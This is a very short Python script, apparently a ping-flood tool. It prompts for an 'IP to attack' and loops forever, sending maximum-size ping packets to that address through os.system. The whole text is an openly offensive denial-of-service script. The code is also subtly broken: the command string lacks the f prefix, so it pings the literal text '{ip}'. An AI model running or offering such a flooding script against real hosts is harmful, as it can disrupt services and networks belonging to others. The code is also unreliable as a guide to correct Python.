```
import os
ip = input("IP to attack: ")
while True:
    os.system("ping {ip} -l 65500 -w 1 -n 1")
```